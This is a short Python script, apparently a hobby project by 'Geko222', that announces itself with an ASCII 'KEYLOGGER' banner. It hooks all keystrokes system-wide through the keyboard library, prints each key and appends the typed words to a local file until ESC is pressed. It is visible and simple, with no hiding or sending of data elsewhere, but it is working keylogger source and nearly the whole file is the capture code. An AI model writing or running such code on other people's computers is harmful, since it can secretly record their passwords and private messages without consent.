import keyboard

print("""
     )             )   (         )                            (     
  ( /(          ( /(   )\ )   ( /(    (        (              )\ )  
  )\())  (      )\()) (()/(   )\())   )\ )     )\ )     (    (()/(  
|((_)\   )\    ((_)\   /(_)) ((_)\   (()/(    (()/(     )\    /(_)) 
|_ ((_) ((_)  __ ((_) (_))     ((_)   /(_))_   /(_))_  ((_)  (_))   
| |/ /  | __| \ \ / / | |     / _ \  (_)) __| (_)) __| | __| | _ \  *☆*――*☆*――*☆*
  ' <   | _|   \ V /  | |__  | (_) |   | (_ |   | (_ | | _|  |   /    By Geko222
 _|\_\  |___|   |_|   |____|  \___/     \___|    \___| |___| |_|_\  *☆*――*☆*――*☆*

""")

palabra = ""

def pulsacion_palabra(pulsacion):
    global palabra

    if pulsacion.event_type == keyboard.KEY_DOWN:
        print(f"Key pressed: {pulsacion.name}")
        if pulsacion.name == "space":
            gpdp()
            palabra = ""
        elif len(pulsacion.name) == 1 and pulsacion.name.isalpha():
            palabra += pulsacion.name

keyboard.hook(pulsacion_palabra)

def gpdp():
    global palabra
    try:
        with open("keyloggerinterno.", "a") as file:
            file.write(palabra + "\n")
            print(f"Written to file: {palabra}")
    except Exception as e:
        print(f"Error writing to file: {e}")

print("Starting keylogger... Press ESC to stop.")
keyboard.wait('esc')
print("Keylogger stopped.")
